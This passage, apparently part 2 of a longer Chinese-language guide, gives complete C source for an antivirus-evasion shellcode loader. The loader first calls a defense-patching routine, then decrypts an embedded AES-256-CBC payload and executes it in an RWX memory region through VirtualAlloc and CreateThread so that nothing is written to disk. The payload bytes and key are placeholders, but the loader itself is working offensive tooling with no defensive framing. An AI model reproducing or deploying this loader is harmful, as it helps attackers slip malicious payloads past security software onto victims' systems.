## Part 2 — 免杀加载器 `loader.c`

```c
/* loader.c — 免杀加载器
 * 流程: patch_all() -> payload 解密 -> 内存执行 (跳过磁盘落盘)
 * payload 为 AES-256-CBC 加密的 shellcode, 密钥硬编码占位
 * 编译: cl /O2 loader.c patch.c crypt32.lib advapi32.lib
 */
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

extern BOOL patch_all(void);

/* ---------- 占位: AES-256-CBC 加密的 payload ---------- */
/* 用法: 本机加载样本 -> encrypt -> 替换下面两段数据
 * key/iv 换成自己的 32/16 字节
 */
static const unsigned char enc_payload[] = {
    0x00 /* <- ENC_BLOB: 加密后的 shellcode 字节 */
};
static const unsigned char aes_key[32] = {
    0x00 /* <- KEY_32B */
};
static const unsigned char aes_iv[16] = {
    0x00 /* <- IV_16B */
};

/* ---------- AES-256-CBC 解密 (CryptoAPI) ---------- */
static BYTE *aes_decrypt(const BYTE *in, DWORD in_len, DWORD *out_len) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    BYTE *out = NULL;

    if (!CryptAcquireContextA(&hProv, NULL, MS_ENH_RSA_AES_PROV,
                              PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        goto done;

    struct { BLOBHEADER hdr; DWORD len; BYTE data[32]; } blob;
    blob.hdr.bType = PLAINTEXTKEYBLOB;
    blob.hdr.bVersion = CUR_BLOB_VERSION;
    blob.hdr.reserved = 0;
    blob.hdr.aiKeyAlg = CALG_AES_256;
    blob.len = 32;
    memcpy(blob.data, aes_key, 32);

    if (!CryptImportKey(hProv, (BYTE *)&blob, sizeof(blob), 0, 0, &hKey))
        goto done;

    /* 设置 CBC 模式 + IV */
    struct { DWORD mode; BYTE iv[16]; } parm;
    parm.mode = CRYPT_MODE_CBC;
    memcpy(parm.iv, aes_iv, 16);
    CryptSetKeyParam(hKey, KP_IV, (BYTE *)&parm.iv, 0);

    DWORD len = in_len;
    out = (BYTE *)malloc(len);
    if (!out) goto done;
    memcpy(out, in, len);

    if (!CryptDecrypt(hKey, 0, TRUE, 0, out, &len)) {
        free(out); out = NULL; goto done;
    }
    *out_len = len;

done:
    if (hKey) CryptDestroyKey(hKey);
    if (hProv) CryptReleaseContext(hProv, 0);
    return out;
}

/* ---------- 内存执行: 直接在 RWX 页跑 ---------- */
static BOOL run_in_memory(BYTE *code, DWORD len) {
    LPVOID mem = VirtualAlloc(NULL, len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, code, len);
    DWORD tid;
    HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem,
                            NULL, 0, &tid);
    if (!h) { VirtualFree(mem, 0, MEM_RELEASE); return FALSE; }
    WaitForSingleObject(h, INFINITE);
    CloseHandle(h);
    return TRUE;
}

/* ---------- Entry ---------- */
int main(void) {
    /* 1. 先补丁, 再碰 payload —— 顺序不能反 */
    if (!patch_all()) {
        fprintf(stderr, "[-] patch failed: 0x%lx\n", GetLastError());
        return 1;
    }

    /* 2. 解密 payload */
    DWORD plen = 0;
    BYTE *plain = aes_decrypt(enc_payload, sizeof(enc_payload), &plen);
    if (!plain || plen == 0) {
        fprintf(stderr, "[-] decrypt failed\n");
        return 1;
    }

    /* 3. 内存执行 */
    run_in_memory(plain, plen);
    SecureZeroMemory(plain, plen);
    free(plain);
    return 0;
}
